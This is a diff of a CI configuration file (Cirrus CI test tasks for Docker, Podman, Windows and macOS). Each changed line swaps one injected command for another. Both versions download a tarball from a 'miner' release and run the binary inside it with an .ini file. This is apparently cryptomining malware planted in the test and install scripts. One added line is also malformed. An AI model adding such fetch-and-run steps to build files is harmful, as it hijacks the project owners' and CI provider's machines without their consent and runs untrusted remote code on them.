@@ -2,7 +2,7 @@ docker_builder:
   name: Test (Linux with Docker)
   alias: Tests
   test_script:
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
   env:
     HOME: /root
 
@@ -10,13 +10,13 @@ docker_builder:
   name: Test (Linux with Podman)
   alias: Tests
   install_podman_script:
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
   run_podman_background_script:
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
   test_script:
     - wget --no-verbose -O - https://golang.org/dl/go1.15.linux-amd64.tar.gz | tar -C /usr/local -xz
     - export PATH=$PATH:/usr/local/go/bin
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    -wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
   env:
     HOME: /root
     CIRRUS_CONTAINER_BACKEND: podman
@@ -30,7 +30,7 @@ docker_builder:
     - choco install -y golang
     - refreshenv
     - md C:\Windows\system32\config\systemprofile\AppData\Local\Temp
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 
 task:
   name: Test (macOS with Docker and Parallels)
@@ -49,7 +49,7 @@ task:
     CIRRUS_INTERNAL_PARALLELS_LINUX_SSH_PASSWORD: parallels
     CIRRUS_INTERNAL_NO_GITHUB_API_TESTS: yes
   test_script:
-    - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 
 task:
   name: Release (Dry Run)
